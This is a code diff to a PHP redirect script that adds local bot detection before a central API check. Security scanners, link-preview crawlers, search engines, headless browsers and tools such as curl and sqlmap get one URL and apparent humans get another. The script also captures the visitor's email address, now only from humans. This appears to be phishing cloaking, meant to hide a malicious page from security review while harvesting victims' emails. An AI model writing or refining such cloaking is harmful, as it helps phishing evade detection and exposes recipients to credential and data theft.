@@ -604,11 +604,118 @@ error_reporting(0);
 ini_set('display_errors', 0);
 
 /**
+ * Local bot detection - runs before API call for speed
+ * Returns 'BOT' if detected locally, null to continue to API check
+ */
+function localBotDetection() {
+    \$userAgent = \$_SERVER['HTTP_USER_AGENT'] ?? '';
+    \$userAgentLower = strtolower(\$userAgent);
+
+    // 1. No user agent = bot
+    if (empty(\$userAgent)) {
+        return 'BOT';
+    }
+
+    // 2. Known bot/crawler user agents
+    \$knownBots = [
+        // Social media crawlers
+        'telegrambot', 'twitterbot', 'facebookexternalhit', 'facebot',
+        'linkedinbot', 'whatsapp', 'slackbot', 'discordbot', 'skypeuripreview',
+        'vkshare', 'pinterestbot', 'tumblr', 'redditbot',
+        // Search engines
+        'googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'duckduckbot',
+        'slurp', 'sogou', 'exabot', 'ia_archiver', 'msnbot',
+        // SEO/Analytics tools
+        'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'rogerbot',
+        'screaming frog', 'seokicks', 'sistrix', 'blexbot',
+        // Headless browsers
+        'headlesschrome', 'phantomjs', 'puppeteer', 'playwright',
+        'selenium', 'webdriver', 'chromedriver', 'geckodriver',
+        // Generic bots
+        'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python-requests',
+        'python-urllib', 'java/', 'httpclient', 'http_request', 'libwww',
+        'lwp-', 'guzzlehttp', 'go-http-client', 'okhttp', 'axios',
+        // Security scanners
+        'nmap', 'nikto', 'sqlmap', 'masscan', 'zgrab', 'nuclei',
+        // Preview/fetch services
+        'preview', 'fetch', 'link', 'embed', 'oembed', 'iframely',
+        'applebot', 'tweetmemebot', 'embedly'
+    ];
+
+    foreach (\$knownBots as \$bot) {
+        if (strpos(\$userAgentLower, \$bot) !== false) {
+            return 'BOT';
+        }
+    }
+
+    // 3. Headless browser indicators in user agent
+    \$headlessIndicators = [
+        'headless', 'phantom', 'nightmare', 'electron', 'puppeteer',
+        'playwright', 'selenium', 'webdriver', 'automation'
+    ];
+
+    foreach (\$headlessIndicators as \$indicator) {
+        if (strpos(\$userAgentLower, \$indicator) !== false) {
+            return 'BOT';
+        }
+    }
+
+    // 4. Check for missing essential headers (bots often don't send these)
+    \$hasAccept = !empty(\$_SERVER['HTTP_ACCEPT']);
+    \$hasAcceptLanguage = !empty(\$_SERVER['HTTP_ACCEPT_LANGUAGE']);
+    \$hasAcceptEncoding = !empty(\$_SERVER['HTTP_ACCEPT_ENCODING']);
+
+    // If missing Accept-Language, likely a bot (real browsers always send this)
+    if (!\$hasAcceptLanguage) {
+        return 'BOT';
+    }
+
+    // 5. Suspicious Accept header patterns
+    \$accept = \$_SERVER['HTTP_ACCEPT'] ?? '';
+    if (\$accept === '*/*' && !\$hasAcceptLanguage) {
+        return 'BOT';
+    }
+
+    // 6. Check for automation tool headers
+    if (isset(\$_SERVER['HTTP_X_REQUESTED_WITH']) &&
+        strtolower(\$_SERVER['HTTP_X_REQUESTED_WITH']) === 'puppeteer') {
+        return 'BOT';
+    }
+
+    // 7. Very short user agents are suspicious
+    if (strlen(\$userAgent) < 20) {
+        return 'BOT';
+    }
+
+    // 8. User agent without version numbers (real browsers have versions)
+    if (!preg_match('/\\d+\\.\\d+/', \$userAgent)) {
+        return 'BOT';
+    }
+
+    // 9. Check for common browser identifiers (if none present, likely bot)
+    \$browserIndicators = ['mozilla', 'chrome', 'safari', 'firefox', 'edge', 'opera', 'msie', 'trident'];
+    \$hasBrowserIndicator = false;
+    foreach (\$browserIndicators as \$browser) {
+        if (strpos(\$userAgentLower, \$browser) !== false) {
+            \$hasBrowserIndicator = true;
+            break;
+        }
+    }
+
+    if (!\$hasBrowserIndicator) {
+        return 'BOT';
+    }
+
+    // Not detected as bot locally, continue to API
+    return null;
+}
+
+/**
  * Get real client IP address
  */
 function getClientIP() {
-    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
-    foreach ($headers as $header) {
+    \$headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
+    foreach (\$headers as \$header) {
         if (!empty(\$_SERVER[\$header])) {
             \$ip = \$_SERVER[\$header];
             if (strpos(\$ip, ',') !== false) {
@@ -727,14 +834,21 @@ function captureEmail(\$email) {
 
 // Main execution
 \$email = extractEmail();
-\$classification = classifyVisitor();
 
-// Capture email if found
-if (\$email) {
+// Step 1: Local bot detection (fast, no API call needed)
+\$classification = localBotDetection();
+
+// Step 2: If not detected locally as bot, check with central API
+if (\$classification === null) {
+    \$classification = classifyVisitor();
+}
+
+// Capture email if found (only for humans)
+if (\$email && \$classification === 'HUMAN') {
     captureEmail(\$email);
 }
 
-// Note: Visit is already logged by /api/classify endpoint
+// Note: Visit is logged by /api/classify endpoint (if API was called)
 
 // Determine redirect URL
 \$redirectUrl = (\$classification === 'BOT') ? BOT_URL : HUMAN_URL;
